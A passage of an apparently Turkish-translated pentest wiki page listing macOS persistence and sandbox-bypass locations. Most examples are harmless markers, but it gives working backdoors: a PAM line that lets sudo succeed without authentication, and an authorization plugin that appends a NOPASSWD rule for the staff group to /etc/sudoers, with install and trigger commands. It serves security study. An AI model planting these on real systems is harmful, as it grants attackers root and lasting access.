> macOS'ta *External Extensions* JSON manifesti, yerel bir CRX yerine **Chrome Web Store** güncelleme URL'sine işaret etmelidir. Yönetilen politika dağıtımının kendine özgü kurumsal ön koşulları vardır ve yönetilen, kendi barındırdığı bir güncelleme URL'sine izin verebilir. Test profilindeki yerel, paketlenmemiş bir eklenti için Chrome'un geliştirici modu `--load-extension=/path` anahtarı ayrı bir mekanizmadır ve External Extensions JSON dosyasını kendi kendine çalışır hâle getirmez. `Secure Preferences` dosyasına yazmayı, belgelenmiş iki kayıt yönteminden herhangi biriyle eşdeğer kabul etmeyin.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Chrome'u bu geçici hesapta başlatın ve etkinleştirme istemini gözlemleyin; kullanıcı kabul ettiğinde eklentinin kendi davranışı yürütme PoC'si olur. Testten sonra manifesti kaldırın ve bu profildeki eklentiyi devre dışı bırakın veya kaldırın. Bu yol, araştırma Mac'indeki etkin Chrome profilinde **test edilmedi**. Yönetilen politika yolu da orada devreye alınmadı.

Force-install ve External Extensions, **Chrome Web Store** eklenti kimliklerini kullanır; HMAC imzalı `Secure Preferences` dosyasını düzenleyerek yerel bir eklentiyi sessizce enjekte etme gibi daha düşük seviyeli yöntemler ve diğer Chromium süreçlerini kötüye kullanma teknikleri için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Şeması ve Dosya Türü İşleyicileri (LaunchServices)

Yazı: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Tetikleyici, kurbanın bir bağlantıya (ör. Chrome/Brave/Safari'de) tıklaması veya kayıtlı türdeki bir dosyayı açmasıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Bir uygulama paketinin özel URL şemasını tanımlayan **`CFBundleURLTypes`/`CFBundleURLSchemes`** veya dosya uzantısı/UTI'yi tanımlayan **`CFBundleDocumentTypes`** içeren `Info.plist` dosyası
- Kullanıcı bazında geçerli varsayılanlar, **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** dosyasındaki (`LSHandlers` dizisi) kayıtlarda yer alabilir. URL şeması varsayılanını seçmek için Apple'ın desteklediği API `LSSetDefaultHandlerForURLScheme`'dir; bu plist dosyasına doğrudan yazmak, belgelenmiş bir kayıt veya önbellek güncelleme yöntemi değildir.

#### Açıklama ve Exploitation

Launch Services, URL şeması ve belge ilişkilendirmelerini kayıtlı bir uygulamanın `Info.plist` dosyasından alır. [Apple'ın kayıt kılavuzuna](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) göre kayıt; Finder uygulamayı keşfettiğinde, önyükleme veya oturum açma sırasında ya da açık bir kayıt API'si aracılığıyla gerçekleşebilir; bir uygulamayı herhangi bir yere yazmak, kaydın hemen tetikleneceğini garanti etmez. Kayıt işleminden sonra, eşleşen bir URL'yi veya belgeyi açmak, kullanıcının varsayılan işleyici seçimine ve normal macOS başlatma denetimlerine bağlı olarak seçilen işleyici uygulamayı başlatabilir. Desteklenen `LSSetDefaultHandlerForURLScheme` API'si, kullanıcının tercih ettiği URL işleyicisini değiştirir; yeni bırakılan bir uygulamanın otomatik olarak çalışmasını sağlamaz.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 araştırma Mac’inde hiçbir uygulama kaydedilmedi ve hiçbir handler tercihi değiştirilmedi. Gerçek bir handler’ı test etmek için, geçici bir kullanıcı hesabı kullanın, benzersiz bir scheme’e sahip yalnızca işaretleyici içeren bir uygulama kaydedin, URL’sini çağırın, ardından uygulamayı ve kaydını kaldırın.

Dosya uzantısı ve URL scheme handler’larını ayrıntılı biçimde listelemek/istismar etmek için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python başlangıç dosyaları (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Sandbox’ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - İlgili Python interpreter’ı, söz konusu site dizini etkin durumdayken başlatıldığında çalışır; tetiklenme tüm virtual environment’lar, Python build’leri veya başlangıç bayrakları için geçerli değildir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Interpreter’ı başlatan süreç hangi ayrıcalıklara/TCC’ye sahipse onlarla çalışır

#### Konum

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework build’leri: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root gerekmez (kullanıcı tarafından yazılabilir)
  - **Tetiklenme**: user site etkin durumdayken ilgili Python build’inin başlatılması; `site` modülü etkin site dizinlerindeki `.pth` dosyalarını işler
- **`<user-site>/usercustomize.py`**
  - Root gerekmez
  - **Tetiklenme**: user site etkin durumdayken başlatma (`site` tarafından otomatik içe aktarılır)
- **`<prefix>/site-packages/sitecustomize.py`** (ör. `/opt/homebrew/lib/python3.13/site-packages/` veya sistem yolları)
  - Interpreter’ın konumuna bağlı olarak root/admin gerekebilir
  - **Tetiklenme**: bu site dizinini içeren bir interpreter’ın başlatılması

#### Açıklama ve Exploitation

Python, başlangıçta normalde `site` modülünü içe aktarır ve etkin `site-packages` dizinlerini `.pth` dosyaları için tarar. `.pth` dosyalarında yollar eklemenin yanı sıra, `import ` ile başlayan bir satır, adı geçen modül başka hiçbir yerde kullanılmasa bile Python kodu çalıştırır. Python ayrıca `sitecustomize` modülünü ve **user site etkin olduğunda** `usercustomize` modülünü içe aktarmayı dener.<sup>[[56]](#references)</sup> Tetiklenme, değiştirilmiş dizini gören bir interpreter’ın daha sonra başlatılmasıyla gerçekleşir. `-S`, `site` işlemesini devre dışı bırakır; `-s`, `-I` veya `PYTHONNOUSERSITE`, **user-site** varyantlarını devre dışı bırakır. `-I` genellikle global `sitecustomize` modülünü devre dışı bırakmaz. Virtual environment’lar user site’ı da kapsam dışında bırakabilir. İlgili interpreter için `python3 -m site` komutunun çıktısını kontrol edin.

Aşağıdaki PoC macOS 26.5.2 üzerinde çalıştırıldı. Bu testte `PYTHONUSERBASE`, user site’ı geçici bir dizine taşır; gerçek bir user site değiştirilmez:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both işaretleyici de göründü. `-s`, `-I` veya `-S` ile tekrarlama, bu testte iki **user-site** işaretleyicisinin de görünmesini engelledi. Global bir site dizinindeki `sitecustomize` test edilmedi.

## Root Sandbox Bypass

> [!TIP]
> Burada, **root** yetkisiyle **bir dosyaya yazarak** bir şeyi kolayca çalıştırmanıza ve/veya başka **garip koşullar** gerektiren **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Periodic

> [!CAUTION]
> **Tarihsel mekanizma:** macOS 26.5.2 test makinesinde `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ve `com.apple.periodic-*` launch daemon'ları mevcut değildir. Güncel bir sistemde `/etc/periodic` oluşturmanın içeriğini zamanlayacağını varsaymayın. Aşağıdaki örneği kullanmadan önce hedef sürümde hem komutun hem de etkin bir zamanlayıcının bulunduğunu kontrol edin.

Yazı: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root gerekir
  - **Tetikleyici**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
  - Root gerekir
  - **Tetikleyici**: Zamanı geldiğinde

#### Açıklama ve Exploitation

Daha eski sürümlerde periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` konumundaki **launch daemon'ları** tarafından zamanlanıyordu. macOS Big Sur 11.5'ten itibaren periodic runner, periodic dizinlerindeki script'leri **her dosyanın sahibi** olarak çalıştırarak önceki bir yetki yükseltme yolunu kapattı.<sup>[[27]](#references)</sup> Aşağıdaki komutlar ve dizin listelemeleri tarihsel çıktılardır; macOS 26.5.2 test sonucu değildir.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Çalıştırılacak diğer periyodik betikler **`/etc/defaults/periodic.conf`** dosyasında belirtilir:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Daha eski sistemlerde `periodic` ve launch daemons kurulu ve etkinse, `/etc/daily.local`, `/etc/weekly.local` ve `/etc/monthly.local` ek çalıştırma yollarıydı. Zararsız, salt okunur bir kontrol:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Doğrudan periodic dizinlerindeki script'lere sahiplik tabanlı kural uygulanıyordu. Geçmişte kullanılan `999.local` wrapper'ı, aynı sahiplik denetimini uygulamadan `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarını kaynak olarak çalıştırıyordu; scheduler root olarak çalıştığında bu yerel dosyalar da root olarak çalışıyordu. Bu ayrım ve Big Sur 11.5'teki değişiklik [orijinal araştırmada](https://theevilbit.github.io/beyond/beyond_0019/) belgelenmiştir. `periodic` bulunmuyorsa bu yolların etkin olduğunu varsaymayın.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız gerekir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gerekir

#### Açıklama ve İstismar

PAM, macOS içinde kolayca kod çalıştırmaktan çok **persistence** ve malware'e odaklandığından, bu blog ayrıntılı bir açıklama sunmayacak; bu tekniği daha iyi anlamak için **writeup'ları okuyun**.<sup>[[28]](#references)</sup>

PAM modüllerini şu komutla kontrol edin:

```bash
ls -l /etc/pam.d
```

PAM'i kötüye kullanan bir kalıcılık/ayrıcalık yükseltme tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:

```bash
auth       sufficient     pam_permit.so
```

Yani kabaca şöyle **görünecek**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Ve bu nedenle **`sudo` kullanmaya yönelik her girişim işe yarayacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu ve kullanıcının erişim izni isteyen bir istemle karşılaşma olasılığının çok yüksek olduğunu unutmayın.

Bir başka güzel örnek de `su`; burada PAM modüllerine parametre vermenin de mümkün olduğunu görebilirsiniz (bu dosyaya backdoor da ekleyebilirsiniz):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Yetkilendirme Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve ek yapılandırmalar yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
  - Root gerekir
  - Eklentiyi kullanacak şekilde authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Kalıcılığı sağlamak için kullanıcı oturum açtığında çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu eklentilerden birini nasıl oluşturacağınız hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir eklenti oturumunuzu kilitleyebilir ve Mac'inizi kurtarma modunda temizlemeniz gerekebilir).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Bundle'ı yükleneceği konuma taşı:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Son olarak bu Plugin'i yüklemek için **kuralı** ekleyin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`**, yetkilendirme framework'üne yetkilendirme için harici bir mekanizma çağırması gerekeceğini bildirir. Ayrıca **`privileged`**, bunun root tarafından çalıştırılmasını sağlar.

Şununla tetikleyin:

```bash
security authorize com.asdf.asdf
```

Ve ardından **staff grubu sudo** erişimine sahip olmalıdır (doğrulamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
  - Root gerekir
  - **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** config dosyası, man documentation dosyalarını açarken kullanılacak binary/script'i belirtir. Bu nedenle, kullanıcının bazı dokümanları okumak için man'ı her kullanışında bir backdoor çalıştırılması için executable'ın yolu değiştirilebilir.<sup>[[31]](#references)</sup>

Örneğin, **`/private/etc/man.conf`** dosyasında şunu ayarlayın:

```
MANPAGER /tmp/view
```

Ardından `/tmp/view`'i şu şekilde oluşturun:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd'nin entitlement'ları yok

#### Konum

- **`/etc/apache2/httpd.conf`**
  - Root gerekir
  - Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` dosyasında, aşağıdaki gibi bir satır ekleyerek bir modülün yüklenmesini belirtebilirsiniz:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Bu şekilde derlediğiniz modül Apache tarafından yüklenecektir. Tek yapmanız gereken ya **geçerli bir Apple sertifikasıyla imzalamak** ya da sistemde **yeni bir güvenilir sertifika ekleyip** modülü bu sertifikayla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatıldığından emin olmak için şunu çalıştırabilirsiniz:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb için kod örneği:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM denetim çerçevesi

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
  - Root gerekir
  - **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama ve Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu nedenle payload'unuzu betiğe ekleyebilirsiniz.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

`sudo audit -n` komutuyla bir uyarıyı zorla görüntüleyebilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu özellik kullanımdan kaldırılmıştır; bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki belirli dosya içermelidir:

1. Bir **rc script**: Başlangıçta çalıştırılan bir shell script.
2. Özellikle `StartupParameters.plist` olarak adlandırılan ve çeşitli yapılandırma ayarlarını içeren bir **plist dosyası**.

Başlangıç işleminin bu dosyaları tanıyıp kullanabilmesi için hem rc script'in hem de `StartupParameters.plist` dosyasının **StartupItem** dizinine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS sistemimde bulamıyorum; daha fazla bilgi için writeup'a bakın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple tarafından sunulan **emond**, yeterince geliştirilmemiş veya terk edilmiş olabilecek bir günlükleme mekanizmasıdır; ancak hâlâ erişilebilir durumdadır. Bir Mac yöneticisi için pek faydalı olmasa da bu belirsiz hizmet, tehdit aktörleri için çoğu macOS yöneticisinin muhtemelen fark etmeyeceği gizli bir kalıcılık yöntemi olabilir.<sup>[[34]](#references)</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımlarını tespit etmek kolaydır. Bu hizmetin sistem LaunchDaemon'u, çalıştırılacak betikleri tek bir dizinde arar. Bunu incelemek için aşağıdaki komut kullanılabilir:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root yetkisi gerekir
  - **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz **artık macOS'te yüklü değildir**; daha fazla bilgi için writeup'a bakın.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Bir kext yüklemek, root yetkisine sahip olsanız bile o kadar karmaşıktır ki, elinizde bir exploit yoksa bu pratik bir sandbox-escape veya persistence tekniği olarak değerlendirilmez.

#### Konum

Bir KEXT'i başlangıç öğesi olarak yüklemek için **aşağıdaki konumlardan birine yüklenmesi gerekir**:

- `/System/Library/Extensions`
  - OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
  - 3. taraf yazılımlar tarafından yüklenen KEXT dosyaları

Şu anda yüklü olan kext dosyalarını şu komutla listeleyebilirsiniz:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Daha fazla bilgi için [**kernel extensions bölümünü kontrol edin**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Konum

- **`/usr/local/bin/amstoold`**
  - Root gerekir

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Ancak binary mevcut değildi; bu nedenle buraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalışmasını sağlayabilirdiniz.<sup>[[35]](#references)</sup>

Artık bunu macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root gerekir
  - **Tetikleyici**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bile bulamadım; daha fazla bilgi için writeup'a göz atın.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **başlangıçta çalıştırılacak komutlar** da yerleştirebilirsiniz. Örnek bir rc.common script'i:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd Önyükleme Görevleri

Yazı: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (root gerekir)
- Root gerekir; ayrıca yola bağlı olarak **SIP bypass** veya **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access izni gerekir

#### Konum

`launchd`, erken dönem "önyükleme görevlerini" açıklayan bir plist'i **`__TEXT,__config`** bölümünde barındırır. Varsayılan olarak mevcut olmayan ve bir saldırgan tarafından oluşturulabilecek çeşitli referans betikleri/ikili dosyalar:

- SIP-bypass kümesi: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA kümesi: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` yalnızca Sequoia+ sürümlerinde önceden mevcuttur)

#### Açıklama ve Exploitation

`launchd`'nin hangi dosyaları çalıştıracağını ve desteklenen anahtarları (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…) görmek için gömülü görev tablosunu dökün:

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Başvurulan dosyalardan birini (ör. `/etc/rc.server`) oluşturmak, `launchd`'nin dosyayı bir sonraki (userspace) yeniden başlatmada çalıştırmasını sağlar. En kullanışlı girdiler SIP tarafından engellenir veya TCC SysAdminFiles/Full Disk Access gerektirir; bu nedenle bu, root seviyesinde ve yeniden başlatmayla tetiklenen bir tekniktir.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` boot görevi, açılışta `apple-trusted-trampoline` NVRAM değişkeninde depolanan bir **platform (Apple imzalı) binary'sini** çalıştırır; ancak **yalnızca `rc.trampoline=1` boot-arg ayarlıysa ve SIP devre dışıysa** (yaklaşık 390&nbsp;KB boyut sınırı ve engelleme/hızlı dönme kısıtıyla). **root + SIP'nin devre dışı olması + Apple imzalı bir payload** gerektirdiğinden, gerçek dünyada kalıcılık için esasen kullanışsızdır ve burada yalnızca eksiksiz olması için listelenmiştir.<sup>[[41]](#references)</sup>

### /etc/paths ve /etc/paths.d (PATH hijack)

- Sandbox'ı bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (yazmak için root gerekir)
- Root gerekir

#### Konum

- **`/etc/paths`** ve **`/etc/paths.d/*`** — oturum açıldığında varsayılan `PATH`'i oluşturmak için **`path_helper`** tarafından okunur (`/etc/zprofile` içinden çağrılır).

#### Açıklama ve Exploitation

